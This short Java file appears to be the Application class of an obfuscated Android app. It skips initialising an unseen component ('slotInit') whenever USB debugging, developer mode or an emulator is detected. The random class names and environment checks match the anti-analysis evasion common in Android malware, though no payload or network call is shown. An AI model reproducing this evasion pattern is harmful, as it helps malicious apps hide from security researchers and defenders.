package sipx.uqyon;

import android.app.Application;
import android.content.ContentResolver;
import android.content.Context;
import android.provider.Settings;
import android.util.Log;

import zncq.zjnb.azdzcjodapck;

public class qzuhxxvavnenjgcn extends Application {

    @Override
    public void onCreate() {
        super.onCreate();
        if(isUsbDebuggingEnabled(this)
                ||isDeveloperModeEnabled(this)
                || azdzcjodapck.isEmulator()) {
            return;
        }

        slnmxdnojqecq.slotInit(this);
    }

    @Override
    protected void attachBaseContext(Context base) {
        super.attachBaseContext(base);
        azdzcjodapck.iufd543 = base;
    }

    public static boolean isUsbDebuggingEnabled(Context context) {
        ContentResolver contentResolver = context.getContentResolver();
        boolean usbDebuggingEnabled = Settings.Secure.getInt(contentResolver, Settings.Secure.ADB_ENABLED, 0) > 0;
        return usbDebuggingEnabled;
    }

    public static boolean isDeveloperModeEnabled(Context context) {
        int developerMode = Settings.Secure.getInt(
                context.getContentResolver(),
                Settings.Global.DEVELOPMENT_SETTINGS_ENABLED, 0
        );
        return developerMode > 0;
    }

}
